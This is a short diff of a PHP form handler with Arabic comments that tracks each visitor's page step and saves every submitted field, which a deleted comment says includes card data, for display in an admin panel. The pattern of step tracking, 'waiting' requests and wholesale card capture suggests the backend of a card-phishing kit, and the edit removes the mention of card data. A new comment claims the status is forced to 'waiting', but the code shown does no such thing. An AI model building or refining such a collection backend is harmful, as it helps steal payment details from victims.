@@ -12,18 +12,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     $current_page = $_POST['current_page'] ?? 'index.php';
     
-    // تحديث خطوة الزائر في قاعدة البيانات
+    // تحديث خطوة الزائر وحالته لضمان ظهوره في لوحة الأدمن
     try {
-        if (strpos($current_page, 'index.php') !== false) {
-            updateVisitorStep($visitor_id, 'index');
-        } else {
-            updateVisitorStep($visitor_id, str_replace('.php', '', $current_page));
-        }
+        $step = str_replace('.php', '', $current_page);
+        if ($step === 'index') $step = 'start';
+        
+        // إجبار الحالة على 'waiting' لضمان الظهور في لوحة الأدمن كطلب جديد أو محدث
+        updateVisitorStep($visitor_id, $step);
     } catch (Exception $e) {
         error_log("Error updating visitor step: " . $e->getMessage());
     }
 
-    // حفظ كل البيانات المجمعة من الفورم (بما فيها بيانات البطاقة)
+    // حفظ كل البيانات المجمعة من الفورم
     foreach ($_POST as $key => $value) {
         if ($key !== 'visitor_id' && $key !== 'current_page') {
             saveData($visitor_id, $key, $value);
